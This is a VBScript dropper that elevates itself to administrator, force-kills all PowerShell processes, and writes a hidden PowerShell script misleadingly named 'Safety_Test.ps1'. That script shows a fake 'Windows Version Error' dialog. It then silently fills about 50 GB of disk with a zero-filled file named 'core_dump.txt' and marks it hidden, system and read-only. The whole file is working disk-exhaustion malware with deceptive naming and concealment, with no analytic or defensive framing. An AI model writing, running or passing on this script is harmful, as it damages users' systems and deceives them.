Set objShell = CreateObject("Shell.Application")
If Not WScript.Arguments.Named.Exists("elevate") Then
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 1
    WScript.Quit
End If

Set fso = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")

WshShell.Run "taskkill /F /IM powershell.exe /T", 0, True

CurrentDir = fso.GetParentFolderName(WScript.ScriptFullName)
psPath = CurrentDir & "\Safety_Test.ps1"
targetFile = CurrentDir & "\core_dump.txt"

On Error Resume Next
WshShell.Run "attrib -s -h -r " & Chr(34) & psPath & Chr(34), 0, True
WshShell.Run "attrib -s -h -r " & Chr(34) & targetFile & Chr(34), 0, True
fso.DeleteFile psPath, True
fso.DeleteFile targetFile, True
On Error GoTo 0

Set psFile = fso.CreateTextFile(psPath, True)
psFile.WriteLine "$TargetDir = '" & CurrentDir & "'"
psFile.WriteLine "$BigFile = Join-Path $TargetDir 'core_dump.txt'"
psFile.WriteLine "Add-Type -AssemblyName PresentationFramework"
psFile.WriteLine "[System.Windows.MessageBox]::Show('Windows Version Error: build 23H2 incompatible.', 'System Error', 0, 16)"
psFile.WriteLine "$Stream = [System.IO.File]::OpenWrite($BigFile)"
psFile.WriteLine "$Buffer = New-Object Byte[] 1048576"
psFile.WriteLine "for($i=1; $i -le 51200; $i++) { $Stream.Write($Buffer, 0, $Buffer.Length); Start-Sleep -Milliseconds 0 }"
psFile.WriteLine "$Stream.Close()"
psFile.WriteLine "attrib +h +s +r $BigFile"
psFile.Close

fso.GetFile(psPath).Attributes = 2 + 4
WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " & Chr(34) & psPath & Chr(34), 0, False

Set fso = Nothing
Set WshShell = Nothing
